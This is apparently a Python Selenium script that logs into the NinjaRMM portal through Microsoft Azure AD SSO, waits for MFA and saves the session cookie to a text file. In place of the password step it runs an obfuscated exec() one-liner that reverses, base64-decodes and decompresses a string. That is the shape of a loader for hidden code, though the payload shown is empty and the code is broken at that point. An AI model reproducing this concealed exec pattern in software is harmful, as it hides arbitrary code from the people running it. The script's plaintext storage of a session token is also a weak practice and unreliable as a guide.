# Download and install ChromeDriver
# curl -O https://storage.googleapis.com/chrome-for-testing-public/131.0.6778.108/linux64/chromedriver-linux64.zip
# unzip chromedriver_linux64.zip
# python script2.py "$(python script1.py)"

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import base64
import time
import traceback
import os

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")

service = Service('')  # Update with path to ChromeDriver
driver = webdriver.Chrome(service=service, options=chrome_options)

def performWebActions(driver):
    try:
        driver.get("https://eu.ninjarmm.com/auth/")
        # NinjaRMM Email input
        email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'email'))
        )
        email_input.send_keys('email') 

        # Wait for SSO login mode to trigger
        element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/form/div[2]/label/div'))
        )
        cont = False
        while not cont:
            if element.text == "Sign in with Azure AD": 
                cont = True

        # Click login button to trigger MS Login Page
        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div/div/form/button'))
        )
        login_button.click()

        # Wait for a moment to allow the page to load <- Maybe not needed
        #time.sleep(5)

        # Input 365 email
        msemail_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'loginfmt'))
        )
        msemail_input.send_keys('email') 

        # Wait for a moment before clicking the Microsoft login button <- Maybe not needed
        #time.sleep(2)

        # Wait for the Microsoft login button to be present and click it
        mslogin_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="idSIButton9"]'))
        )
        mslogin_button.click()

        # Wait for a moment to allow the password input to load
        #time.sleep(5) <- Maybe not needed

        # Wait for the password input to be present
        mspassword_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'passwd'))
        )
        
        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))

        time.sleep(2) # Wait for a moment before clicking the login button <- Maybe not needed
        
        # Wait for the login button to be present and click it
        mslogin_button_pw = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="idSIButton9"]'))
        )
        mslogin_button_pw.click()

        # Wait for a few seconds to ensure the login process completes <- Maybe not needed
        #time.sleep(5)

        element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="idRichContext_DisplaySign"]'))
        )

        # Get the inner text of the element
        inner_text = element.text

        print(inner_text)
        # sometimes mfa when entered doesn't progress to the next page so this confirmation is neccessary
        entered = False
        while not entered:
            user_input = input("MFA Entered? Y: ")
            if user_input.upper() == "Y":
                entered = True
            else:
                print("Please enter a valid string! Acceptable Values: Y/y")
        
        try:
            mslogin_staysignedin = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, '//*[@id="lightbox"]/div[3]/div/div[2]/div/div[1]'))
            )
            inner_text = mslogin_staysignedin.text
            if not inner_text == "Stay signed in?":
                print("Looks like the stay signed in page isn't loading...")
            else:
                mslogin_button_mfa_pw = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, '//*[@id="idSIButton9"]'))
                )
                mslogin_button_mfa_pw.click()
        except TimeoutException:
            print("Element not found within 5 seconds. Retriggering flow.")
            driver.quit() 
            driver = webdriver.Chrome(service=service, options=chrome_options)
            performWebActions(driver)
            exit(0)

        # Check page has loaded
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="application-sidebar"]'))
        )     
    except Exception as e:
        print("An error occurred:", str(e))
        print("Type of error:", type(e).__name__)
        print("Traceback:")
        traceback.print_exc()

    # Check for session key in cookies
    session_key = driver.get_cookie('sessionKey')  # Replace with the actual cookie name
    if session_key:
        print("Session Key:", session_key['value'])
        driver.quit()
        return session_key['value']
    else:
        driver.quit()
        print("Session Key not found in cookies.")

def main():
    sessionkey = None
    while sessionkey is None:
        sessionkey = performWebActions(driver)

    current_path = os.path.dirname(os.path.abspath(__file__))
    file_path = f"{current_path}/active_sessionkey.txt"

    if os.path.exists(file_path):
        os.remove(file_path)
    
    with open(file_path, 'w') as file:
        file.write(sessionkey)

if __name__ == "__main__":
    main()